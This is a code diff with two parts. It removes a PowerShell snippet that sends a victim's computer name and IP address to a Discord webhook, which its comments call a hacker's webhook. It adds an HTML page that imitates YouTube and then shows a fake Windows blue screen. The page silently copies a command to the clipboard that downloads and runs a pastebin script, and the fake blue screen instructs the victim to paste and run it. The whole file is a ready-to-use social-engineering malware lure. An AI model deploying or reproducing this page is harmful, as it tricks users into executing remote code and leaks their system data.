@@ -1,18 +1,360 @@
-powershell -nop -w hidden -c "
-    # 1. 해커의 디스코드 웹훅 주소 (예시)
-    $WebhookURL = 'https://discord.com/api/webhooks/1467331557290152204/8BA_qcr4s5pAy2WIJ_8FuimfLwiTEcS0zLR_J266RJMRy-XEu2U5M-XRXdAlhYslpNok';
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube</title>
+    <style>
+        /* 기본 레이아웃 */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            font-family: "Roboto", "Arial", sans-serif;
+            overflow: hidden;
+            background-color: #ffffff;
+        }
 
-    # 2. 내 컴퓨터에서 훔치고 싶은 정보 수집
-    $Content = @{
-        username = 'Hacker Bot';
-        content = '새로운 희생자 정보 도착!';
-        embeds = @(@{
-            title = 'System Info';
-            description = 'PC 이름: ' + $env:COMPUTERNAME + ' | IP: ' + (Invoke-RestMethod 'https://api.ipify.org');
-            color = 16711680; # 빨간색
-        })
-    } | ConvertTo-Json;
+        /* --- 유튜브 배경 레이아웃 --- */
+        #launcher {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            color: #0f0f0f;
+        }
 
-    # 3. 디스코드 웹훅으로 정보 전송
-    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Content -ContentType 'application/json';
-"
+        /* 유튜브 헤더 */
+        .yt-header {
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+            background: #fff;
+        }
+
+        .header-left { display: flex; align-items: center; gap: 16px; }
+        .menu-icon { font-size: 20px; cursor: pointer; }
+        .yt-logo { display: flex; align-items: center; font-weight: bold; font-size: 18px; letter-spacing: -1px; cursor: pointer; }
+        .yt-logo svg { width: 30px; margin-right: 4px; }
+
+        .header-center { flex: 0 1 720px; display: flex; align-items: center; gap: 12px; }
+        .search-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            height: 40px;
+            border: 1px solid #ccc;
+            border-radius: 40px 0 0 40px;
+            padding: 0 4px 0 16px;
+            margin-left: 32px;
+        }
+        .search-container input { border: none; flex: 1; outline: none; font-size: 16px; }
+        .search-btn {
+            width: 64px;
+            height: 40px;
+            background: #f8f8f8;
+            border: 1px solid #ccc;
+            border-left: none;
+            border-radius: 0 40px 40px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        /* 메인 콘텐츠 영역 */
+        .yt-main { display: flex; flex: 1; overflow: hidden; }
+        
+        /* 사이드바 */
+        .yt-sidebar { width: 240px; padding-top: 12px; flex-shrink: 0; }
+        .side-item { height: 40px; display: flex; align-items: center; padding: 0 24px; font-size: 14px; cursor: pointer; border-radius: 10px; margin: 0 12px; }
+        .side-item:hover { background: #f2f2f2; }
+        .side-item.active { background: #f2f2f2; font-weight: bold; }
+
+        /* 비디오 영역 */
+        .yt-content-wrapper { flex: 1; display: flex; flex-direction: column; overflow-y: auto; background: #fff; }
+        
+        /* 카테고리 칩 */
+        .chips-bar {
+            padding: 12px 24px;
+            display: flex;
+            gap: 12px;
+            overflow-x: hidden;
+            white-space: nowrap;
+            background: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        .chip { padding: 6px 12px; background: #f2f2f2; border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .chip.active { background: #0f0f0f; color: #fff; }
+
+        /* 비디오 그리드 */
+        .video-grid {
+            padding: 24px;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 16px;
+        }
+        .video-item { display: flex; flex-direction: column; cursor: pointer; }
+        .thumb { width: 100%; aspect-ratio: 16/9; background: #e5e5e5; border-radius: 12px; margin-bottom: 12px; }
+        .v-info { display: flex; gap: 12px; }
+        .v-avatar { width: 36px; height: 36px; background: #ddd; border-radius: 50%; flex-shrink: 0; }
+        .v-text { display: flex; flex-direction: column; gap: 4px; }
+        .v-title { height: 18px; width: 90%; background: #eee; border-radius: 4px; }
+        .v-meta { height: 14px; width: 60%; background: #f5f5f5; border-radius: 4px; }
+
+        /* 시스템 메시지 모달 */
+        .modal-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 1000;
+        }
+        .modal {
+            background: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            width: 380px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+        }
+        .modal h3 { margin-top: 0; color: #333; }
+        .modal p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 24px; }
+        .btn-refresh {
+            background: #0078d7; color: #fff; border: none;
+            padding: 12px 40px; border-radius: 4px; font-size: 15px;
+            font-weight: bold; cursor: pointer; width: 100%;
+        }
+
+        /* --- 블루스크린 (BSOD) --- */
+        #bsod {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background-color: #0078d7;
+            color: white;
+            padding: 10% 12%;
+            box-sizing: border-box;
+            z-index: 9999;
+            user-select: none;
+            cursor: none;
+        }
+
+        .bsod-emoticon { font-size: 120px; font-weight: 300; margin-bottom: 30px; }
+        .bsod-main-msg { font-size: 26px; line-height: 1.4; margin-bottom: 40px; font-weight: 400; max-width: 900px; }
+        
+        .bsod-list { list-style: none; padding: 0; margin-bottom: 40px; font-size: 22px; }
+        .bsod-list li { margin-bottom: 15px; display: flex; align-items: center; }
+        
+        /* 키보드 키 스타일 (이미지 반영) */
+        .key {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 4px;
+            padding: 2px 12px;
+            margin: 0 8px;
+            min-width: 32px;
+            height: 38px;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        .key svg { width: 18px; fill: white; }
+
+        .bsod-footer { font-size: 18px; margin-top: 40px; opacity: 0.9; }
+        .bsod-support { font-size: 18px; margin: 15px 0 25px 0; opacity: 0.9; }
+        
+        .bsod-code-box {
+            background-color: rgba(0, 0, 0, 0.15);
+            padding: 20px 30px;
+            display: inline-block;
+            font-size: 18px;
+            border-radius: 2px;
+            width: 100%;
+            max-width: 750px;
+        }
+
+        /* 전체화면 시 요소 제어 */
+        :fullscreen #launcher { display: none; }
+        :fullscreen #bsod { display: block; }
+        :-webkit-full-screen #bsod { display: block; }
+    </style>
+</head>
+<body>
+
+    <!-- 유튜브 배경 레이어 -->
+    <div id="launcher">
+        <header class="yt-header">
+            <div class="header-left">
+                <div class="menu-icon">☰</div>
+                <div class="yt-logo">
+                    <svg viewBox="0 0 90 20" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M27.97 18.923c-5.592 0-10.125-4.533-10.125-10.125C17.845 3.206 22.378-1.327 27.97-1.327c5.592 0 10.125 4.533 10.125 10.125 0 5.592-4.533 10.125-10.125 10.125zm0-18.125c-4.411 0-8 3.589-8 8s3.589 8 8 8 8-3.589 8-8-3.589-8-8-8z" fill="#ff0000"/>
+                        <text x="35" y="16" font-family="Arial" font-weight="bold" font-size="16">YouTube</text>
+                    </svg>
+                </div>
+            </div>
+            <div class="header-center">
+                <div class="search-container">
+                    <input type="text" placeholder="검색">
+                </div>
+                <div class="search-btn">🔍</div>
+            </div>
+            <div class="header-right" style="width: 150px;"></div>
+        </header>
+
+        <div class="yt-main">
+            <nav class="yt-sidebar">
+                <div class="side-item active">홈</div>
+                <div class="side-item">Shorts</div>
+                <div class="side-item">구독</div>
+                <hr style="border:none; border-top:1px solid #eee; margin:12px 0;">
+                <div class="side-item">나중에 볼 동영상</div>
+                <div class="side-item">오프라인 저장</div>
+            </nav>
+            <div class="yt-content-wrapper">
+                <div class="chips-bar">
+                    <div class="chip active">전체</div>
+                    <div class="chip">게임</div>
+                    <div class="chip">뉴스</div>
+                    <div class="chip">음악</div>
+                    <div class="chip">믹스</div>
+                    <div class="chip">라이브</div>
+                    <div class="chip">최근에 업로드된 동영상</div>
+                </div>
+                <div class="video-grid">
+                    <!-- 비디오 카드 8개 생성 -->
+                    <script>
+                        for(let i=0; i<8; i++) {
+                            document.write(`
+                                <div class="video-item">
+                                    <div class="thumb"></div>
+                                    <div class="v-info">
+                                        <div class="v-avatar"></div>
+                                        <div class="v-text">
+                                            <div class="v-title"></div>
+                                            <div class="v-meta"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            `);
+                        }
+                    </script>
+                </div>
+            </div>
+        </div>
+
+        <!-- 새로고침 유도 모달 -->
+        <div class="modal-overlay">
+            <div class="modal">
+                <h3>페이지 응답 없음</h3>
+                <p>시스템 업데이트 설치를 완료하려면 현재 페이지를 새로고침해야 합니다. 작업 중인 내용을 저장하십시오.</p>
+                <button class="btn-refresh" onclick="triggerBSOD()">새로고침</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 블루스크린 레이어 (이미지 1 반영) -->
+    <div id="bsod">
+        <div class="bsod-emoticon">:(</div>
+        
+        <div class="bsod-main-msg">
+            Your PC ran into a problem. Follow the recovery instructions below to protect your data.
+        </div>
+
+        <ul class="bsod-list">
+            <li>1. Hold 
+                <span class="key">
+                    <svg viewBox="0 0 88 88" xmlns="http://www.w3.org/2000/svg"><path d="M0 12.402l35.687-4.86.016 34.423-35.67.203v-29.766zm35.687-5.483l52.313-7.513v37.451l-52.313.369v-30.307zm52.313 41.205l.011 37.489-52.324-7.37v-30.505l52.313.386zm-52.324 30.113l-35.676-4.903v-29.75l35.676.252v34.401z"/></svg>
+                </span> 
+                and press 
+                <span class="key">R</span> .
+            </li>
+            <li>2. Hold <span class="key">Ctrl</span> and press <span class="key">V</span> .</li>
+            <li>3. Press <span class="key">Ok</span> or <span class="key">Enter</span> .</li>
+        </ul>
+
+        <div class="bsod-footer">
+            For more information about this issue and possible fixes, visit our website.
+        </div>
+
+        <div class="bsod-support">
+            If you call a support person, give them this info:
+        </div>
+
+        <div class="bsod-code-box">
+            Step code: 0x00000fVA
+        </div>
+    </div>
+
+    <script>
+        // 복사할 대상 명령어
+        const targetCommand = 'powershell "iex(iwr -useb https://pastebin.com/raw/ZYwycauQ)"';
+        const originalTitle = document.title;
+
+        // 클립보드 복사 함수
+        function copyText(text) {
+            const textArea = document.createElement("textarea");
+            textArea.value = text;
+            textArea.style.position = "fixed";
+            textArea.style.left = "-9999px";
+            textArea.style.top = "0";
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            try {
+                document.execCommand('copy');
+            } catch (err) {
+                console.error('Copy failed', err);
+            }
+            document.body.removeChild(textArea);
+        }
+
+        // Win + R 감지 및 복사
+        window.addEventListener('keydown', function(e) {
+            if (e.metaKey && e.key.toLowerCase() === 'r') {
+                copyText(targetCommand);
+            }
+        });
+
+        // BSOD 시뮬레이션 시작
+        function triggerBSOD() {
+            // 전체화면 시 제목 숨기기
+            document.title = " "; 
+            
+            // 즉시 명령어 복사
+            copyText(targetCommand);
+
+            const docElm = document.documentElement;
+            if (docElm.requestFullscreen) {
+                docElm.requestFullscreen();
+            } else if (docElm.webkitRequestFullscreen) {
+                docElm.webkitRequestFullscreen();
+            }
+
+            document.getElementById('launcher').style.display = 'none';
+            document.getElementById('bsod').style.display = 'block';
+        }
+
+        // 전체화면 종료 감지
+        const exitHandler = () => {
+            if (!document.fullscreenElement && !document.webkitIsFullScreen) {
+                document.title = originalTitle;
+                document.getElementById('bsod').style.display = 'none';
+                document.getElementById('launcher').style.display = 'flex';
+            }
+        };
+
+        document.addEventListener('fullscreenchange', exitHandler);
+        document.addEventListener('webkitfullscreenchange', exitHandler);
+    </script>
+</body>
+</html>
